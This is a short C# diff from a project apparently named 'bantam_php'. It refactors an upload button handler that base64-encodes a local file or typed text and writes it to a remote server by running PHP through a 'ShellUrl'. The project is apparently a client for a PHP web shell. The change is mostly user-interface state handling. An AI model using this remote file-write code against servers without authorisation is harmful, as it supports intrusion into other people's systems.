@@ -92,23 +92,34 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void btnUpload_Click(object sender, EventArgs e)
         {
-            string b64FileContents = string.Empty;
+            btnUpload.Enabled = false;
+            richTextBox1.Enabled = false;
+            btnBrowse.Enabled = false;
+
+            string phpCode = string.Empty;
 
             if (!string.IsNullOrEmpty(LocalFileLocation)) {
-                byte[] fileContents = File.ReadAllBytes(LocalFileLocation);
-                b64FileContents = Convert.ToBase64String(fileContents);
+                phpCode = Convert.ToBase64String(File.ReadAllBytes(LocalFileLocation));
             } else if (!string.IsNullOrEmpty(richTextBox1.Text)) {
-                b64FileContents = Helper.EncodeBase64ToString(richTextBox1.Text);
+                phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
             } else {
                 //todo level 3 logging
+                btnUpload.Enabled = true;
                 return;
             }
             string remoteFileLocation = ServerPath + "/" + txtBoxFileName.Text;
-            string phpCode = PhpHelper.WriteFile(remoteFileLocation, b64FileContents);
+
+            phpCode = PhpHelper.WriteFile(remoteFileLocation, phpCode);
 
             await WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, true);
-           // GC.Collect();
+
+            GC.Collect();
+
             this.Close();
+
+            btnUpload.Enabled = true;
+            richTextBox1.Enabled = true;
+            btnBrowse.Enabled = true;
         }
 
         /// <summary>
